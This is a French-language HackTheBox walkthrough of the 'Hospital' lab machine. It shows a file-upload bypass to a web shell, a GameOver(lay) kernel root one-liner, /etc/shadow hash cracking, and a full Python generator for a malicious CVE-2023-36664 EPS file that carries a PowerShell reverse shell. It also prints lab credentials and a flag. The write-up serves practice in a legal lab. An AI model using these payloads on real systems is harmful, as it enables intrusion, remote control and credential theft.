---
title: Hospital  - HacktheBox
date: 2024-04-24 18:57:35 +0000
description: Hospital est une machine Windows de difficulté moyenne qui héberge un environnement Active Directory, un serveur web et une instance RoundCube. L'application web présente une vulnérabilité de téléchargement de fichier qui permet l'exécution de code PHP arbitraire, conduisant à un shell inversé sur la machine virtuelle Linux hébergeant le service. L'énumération du système révèle un noyau Linux obsolète qui peut être exploité pour obtenir des privilèges root, via le CVE-2023-35001. L'accès privilégié permet de lire les hachages /etc/shadow et de les craquer par la suite, ce qui permet d'obtenir les informations d'identification de l'instance RoundCube. Les courriels sur le service indiquent l'utilisation de GhostScript, qui ouvre la cible à l'exploitation via CVE-2023-36664, une vulnérabilité exploitée en créant un fichier Embedded PostScript (EPS) malveillant pour obtenir une exécution de code à distance sur l'hôte Windows. L'accès au système est alors obtenu de plusieurs manières en utilisant un enregistreur de frappe pour capturer les informations d'identification de l'administrateur, ou en abusant de permissions XAMPP mal configurées.
categories: [HacktheBox]
tags: [HTB, CTFs, Hacking]
image:
    path:
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance

```sh
└─# /home/blo/CTFs/CTFs-Journey/Scripts/nmapauto.sh $ip
###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 19:12 GMT
Initiating Ping Scan at 19:12
Scanning 10.10.11.241 [4 ports]
Completed Ping Scan at 19:12, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:12
Completed Parallel DNS resolution of 1 host. at 19:12, 0.05s elapsed
Initiating SYN Stealth Scan at 19:12
Scanning 10.10.11.241 [1000 ports]
Discovered open port 3389/tcp on 10.10.11.241
Discovered open port 135/tcp on 10.10.11.241
Discovered open port 53/tcp on 10.10.11.241
Discovered open port 22/tcp on 10.10.11.241
Discovered open port 443/tcp on 10.10.11.241
Discovered open port 139/tcp on 10.10.11.241
Discovered open port 8080/tcp on 10.10.11.241
Discovered open port 445/tcp on 10.10.11.241
Discovered open port 2103/tcp on 10.10.11.241
Discovered open port 593/tcp on 10.10.11.241
Discovered open port 2105/tcp on 10.10.11.241
Discovered open port 2179/tcp on 10.10.11.241
Discovered open port 389/tcp on 10.10.11.241
Discovered open port 1801/tcp on 10.10.11.241
Discovered open port 88/tcp on 10.10.11.241
Discovered open port 3269/tcp on 10.10.11.241
Discovered open port 636/tcp on 10.10.11.241
Discovered open port 464/tcp on 10.10.11.241
Discovered open port 3268/tcp on 10.10.11.241
Discovered open port 2107/tcp on 10.10.11.241
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
           Raw packets sent: 1988 (87.448KB) | Rcvd: 25 (1.084KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,8080                        
----------------------------------------------------------------------------------------------------------                

Completed Parallel DNS resolution of 1 host. at 19:12, 0.00s elapsed
Initiating SYN Stealth Scan at 19:12
Scanning 10.10.11.241 [65535 ports]
Discovered open port 3389/tcp on 10.10.11.241
Discovered open port 443/tcp on 10.10.11.241
Discovered open port 8080/tcp on 10.10.11.241
Discovered open port 22/tcp on 10.10.11.241
Discovered open port 135/tcp on 10.10.11.241
Discovered open port 139/tcp on 10.10.11.241
Discovered open port 445/tcp on 10.10.11.241
Discovered open port 53/tcp on 10.10.11.241
Completed NSE at 19:15, 0.00s elapsed
Nmap scan report for 10.10.11.241
Host is up (0.21s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-23T11:01:49
| Not valid after:  2024-10-23T11:01:49
| MD5:   a03e:b529:21ec:2869:050f:19be:ba19:2762
|_SHA-1: 312a:9071:17ea:17a6:bb2b:b096:4c65:ef7a:4e6d:8a51
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-25T02:14:26+00:00
8080/tcp open  http          Apache httpd 2.4.55 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.55 (Ubuntu)
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2024-04-25T02:14:26
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
```

### Petite notes
- Le domain `hospital.htb` et le Domain Controller `DC.hospital.htb`
- Kerberoas ouvert sur le port 88
- Les ports (SMB/RDP/MSRPC) sont ouverts
- Un serveur web sur les port `8080`

Dans les `smb` rien, donc je vais juste aller sur le serveur web et voir ce qui s'y trouve.

![a1]()
en visitant le site je trouve on me demande d'upload un fichier, mais seulement des images car toutes fichiers php ne marche pas.

![a2]()

En mettant un fichier en `.phar` ca marche tres bien

![a3]

Ok d'ici la, je vais upload `p0wny_shell` pour avoir un reverse shell

![a4]()

### Escape the Container

```sh
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Dans le `/home` j'ai trouver un user `drwilliams`

### GameOver(lay) Ubuntu Privilege Escalation(CVE-2023-2640 CVE-2023-3262)

```sh
www-data@webserver:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
</var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
id
uid=0(root) gid=33(www-data) groups=33(www-data)

cat /etc/shadow
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::

```

### Crack the Hash

```sh
─# hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2868/5800 MB (1024 MB allocatable), 8MCU

$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
Time.Started.....: Wed Apr 24 20:02:47 2024 (1 min, 58 secs)
Time.Estimated...: Wed Apr 24 20:04:45 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1816 H/s (6.93ms) @ Accel:256 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 214272/14344387 (1.49%)
Rejected.........: 0/214272 (0.00%)
Restore.Point....: 214016/14344387 (1.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidate.Engine.: Device Generator
Candidates.#1....: rayman2 -> puddings
Hardware.Mon.#1..: Temp: 79c Util: 95%

Started: Wed Apr 24 20:02:43 2024
Stopped: Wed Apr 24 20:04:47 2024
```

Ok maintenant que je viens de cracker le mot de passe de `drwilliams` alors je vais utiliser ces identifiants dans le login du site `hospital.htb` dans le port `443`

```plaintext
Dear Lucy,

I wanted to remind you that the project for lighter, cheaper and
environmentally friendly needles is still ongoing 💉. You are the one in
charge of providing me with the designs for these so that I can take
them to the 3D printing department and start producing them right away.
Please make the design in an ".eps" file format so that it can be well
visualized with GhostScript.

Best regards,
Chris Brown.
```

![roundcube version]()

En cherchant cette version en ligne je trouve plusieurs informations sur le `CVE-2023-36664`. je vais utiliser ce script pour generer le payload en `.eps`

<details>
<summary>Click ici pour afficher le script</summary>

```python
import argparse
import os
import re
import subprocess
import base64

def get_user_input():
    ip_command = "ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1"
    ip = subprocess.check_output(ip_command, shell=True).decode().strip()
    print(f"Detected Tun0 IP: {ip}")
    user_ip = input("Enter to accept IP or type new IP: ")
    ip = user_ip if user_ip else ip
    port = input("Enter NetCat connect back port: ")
    filename = input("Enter filename: ")

    return ip, port, filename

def generate_payload(ip, port):
    payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}};
$client.Close()"""

    base64_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    final_payload = f"powershell -e {base64_payload}"
    escaped_payload = f"(%pipe%{final_payload}) (w) file /DCTDecode filter"
    return escaped_payload

def generate_payload_file(filename, payload):
    content = f"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Malicious EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Sup breachforums!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
{payload}
showpage"""

    filename = filename + '.eps'
    with open(filename, 'w') as file:
        file.write(content)

def main():
    ip, port, filename = get_user_input()
    payload = generate_payload(ip, port)
    generate_payload_file(filename, payload)
    print(f"\n[+] Generated malicious .eps file: {filename}.eps")
    print(f"[+] Popping your courtesy netcat shell: {ip} -lvnp {port}")
    print(f"[+] Log into RoundCubeMail and reply to Dr Brown's email, \n    attach {filename}.eps and send. Rev Shell takes a few seconds :)")
    command = f'qterminal -e "bash -c \'nc -lvnp {port}; exec bash\'"'
    subprocess.Popen(command, shell=True)

if __name__ == "__main__":
    main()                                                                                                                      
```

</details>

```sh
# python3 hacked.py 
Detected Tun0 IP: 10.10.14.154
Enter to accept IP or type new IP: 
Enter NetCat connect back port: 1337
Enter filename: reverse

[+] Generated malicious .eps file: reverse.eps
[+] Popping your courtesy netcat shell: 10.10.14.154 -lvnp 1337
[+] Log into RoundCubeMail and reply to Dr Brown's email, 
    attach reverse.eps and send. Rev Shell takes a few seconds :)


```

![answer]()

Et maintenant je recois une connexion entrante
![Connexion]()
Donc a partir d'ici je trouve un fichier nommee `GhostScript.bat`, a l'interieur je trouve un mot de passe de l'utilisateur `drbrown`
```sh
PS C:\Users\drbrown.HOSPITAL\documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

```sh
PS C:\Users\drbrown.HOSPITAL\Desktop> type user.txt
f35a1e348ca6cd6e5063b40165fd330c
PS C:\Users\drbrown.HOSPITAL\Desktop>
```

## Privilege Escalation











## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
[]()
[]()
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
